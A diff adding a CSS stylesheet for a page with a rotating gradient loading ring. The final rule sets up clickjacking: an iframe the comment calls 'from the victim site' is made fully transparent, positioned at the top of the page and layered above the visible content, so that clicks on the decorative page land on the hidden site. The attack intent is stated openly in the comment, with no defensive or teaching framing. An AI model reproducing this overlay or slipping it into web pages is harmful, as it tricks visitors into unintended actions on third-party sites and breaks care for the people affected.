@@ -1,0 +1,73 @@
+html,body{
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	height: 100vh;
+	font-family: sans-serif;
+	overflow: hidden;
+	background: black;
+}
+.outer{
+	height: 300px;
+	width: 300px;
+	background: linear-gradient(135deg, #FEED07 0%, #FE6A50 5%, #ED00AA 15%, #2FE3FE 50%, #8900FF 100%);
+	border-radius: 50%; 
+	border:2px solid white;
+}
+
+.inner{
+position: absolute;
+width: 275px;
+height: 275px;
+text-align: center;
+line-height: 275px;
+background: black;
+border-radius: 50%;
+cursor: default;
+border:2px solid white;
+}
+
+.inner span{
+	font-size: 60px;
+	font-weight: bold;
+	color: transparent;
+	background: linear-gradient(135deg, #FEED07 0%, #FE6A50 5%, #ED00AA 15%, #2FE3FE 50%, #8900FF 100%);
+	-webkit-background-clip: text;
+	background-size: 300%;
+}
+.loadingaktif{
+	animation: rotate 2s ease infinite;
+}
+
+@keyframes rotate{
+	to{
+		transform: rotate(360deg);
+	}
+}
+
+.loadingaktif-2{
+	animation: rotate2 3s ease;
+}
+@keyframes rotate2{
+	to{
+		transform: rotate(360deg);
+	}
+}
+h1{
+	position: absolute;
+	top: 0;
+	margin-bottom: 25px;
+	text-transform: uppercase;
+	font-family: serif;
+	color: white;
+}
+iframe { /* iframe from the victim site */ 
+width: 400px; 
+height: 100px; 
+position: absolute; 
+top:0; 
+left:-20px; 
+opacity: 0; 
+/* in real opacity:0 */ 
+z-index: 1;
+ } 
